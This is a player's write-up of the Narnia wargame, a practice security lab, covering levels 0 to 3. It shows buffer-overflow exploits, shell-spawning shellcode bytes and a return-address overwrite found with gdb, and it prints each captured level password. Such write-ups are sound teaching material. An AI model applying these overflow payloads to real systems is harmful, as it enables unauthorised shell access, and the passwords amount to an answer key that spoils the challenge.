# [The Narnia wargame](https://overthewire.org/wargames/narnia/)
host: [narnia.labs.overthewire.org](narnia.labs.overthewire.org)  
port: 2226  
username: narnia<level>  
start password: narnia0  
### login via ssh
```
ssh narnia<level>@narnia.labs.overthewire.org -p 2226
```

### level 0 -> 1
Simple buffer overflow
```shell
narnia0@narnia:/narnia$ (printf 'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde';cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
**password:**  
efeidiedae

### level 1 -> 2
We need to set environment variable named "EGG" to shellcode the program will run  
I use [this](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode to open shell as narnaia1
```shell
narnia1@narnia:/narnia$ export EGG=$(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
nairiepecu
```
**password:**  
nairiepecu
  
### level 2 -> 3
There is unsafe copy to buffer, we can use this to set return address to run our shellcode.
First of all we need to find what offset the return address, we will use gdb with breakpoint before the ret command.
```shell
narnia2@narnia:/narnia$ gdb -q ./narnia2
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804844b <+0>:     push   %ebp
   0x0804844c <+1>:     mov    %esp,%ebp
      ...
   0x08048497 <+76>:    mov    $0x0,%eax
   0x0804849c <+81>:    leave                 <- we will put breakpoint her
   0x0804849d <+82>:    ret
End of assembler dump.
(gdb) b *0x0804849c
Breakpoint 1 at 0x804849c
(gdb) r $(python -c "print('A'*132+'B'*4)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c "print('A'*132+'B'*4)")

Breakpoint 1, 0x0804849c in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()                         <- the four 'B' override the return address
```
Now lets create the payload, it will be in this format:  
(A series of NOP instructions(0x90)) (Shellcode) (Overridden return address)  
the return address will jump to address just before the shellcode.  
I use the [same](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode(25 bytes) as in the previous level.  
We just need to know the address before the shellcode:  
```shell
(gdb) r $(python -c "print('A'*(132-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + 'B'*4)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c "print('A'*(132-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + 'B'*4)")

Breakpoint 1, 0x0804849c in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/150wx $esp
0xffffd640:     0x00000000      0xffffd6d4      0xffffd6e0      0x00000000
0xffffd650:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
...
0xffffd7f0:     0x9e797a0d      0x9908446a      0x695d19dc      0x00363836
0xffffd800:     0x6e2f0000      0x696e7261      0x616e2f61      0x61696e72
0xffffd810:     0x41410032      0x41414141      0x41414141      0x41414141          <- the 'A's start somewhere here
0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd870:     0x41414141      0x41414141      0x41414141      0x50c03141          <- here the shellcode start
0xffffd880:     0x732f2f68      0x622f6868      0xe3896e69      0xe1895350
0xffffd890:     0x0bb0c289      0x424280cd
```
So, let choose 0xffffd870, now use the payload!
```shell
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print('\x90'*107 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x70\xd8\xff\xff')")
$ cat /etc/narnia_pass/narnia3
vaequeezee
```
  
**password:**  
vaequeezee
                                                                                       
### level 3 -> 4
Their is unsafe copy from argv[1] to ifile, so we can overflow and get into ofile  
We need to give the program path that serve as somthing we want to read and also serve as payload that pushed to 'ofile' and serve as output file we can read. The path will be in this format:  
'/tmp/(some padding)/tmp/result'  
'/tmp/result' will serve as output file and '/tmp/(padding)/tmp/result' as link to password (/etc/narnia_pass/narnia4)  
Therefore the program will read all data from '/tmp/<padding>/tmp/result and insead of write it to /dev/null he will write it to '/tmp/result' and we can read it.  
I create [this](https://gist.github.com/bom2013/919a78a2dcb44689d37587bedb43be49) script in some folder inside /tmp/ and run it
```shell
narnia3@narnia:/tmp/qwert$ ./solve.sh
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/result to a safer place... (/tmp/result)
thaenohtai
(.PT narnia3@narnia:/tmp/qwert$
```
**password:**  
thaenohtai
  
### level 4 -> 5

**password:**  

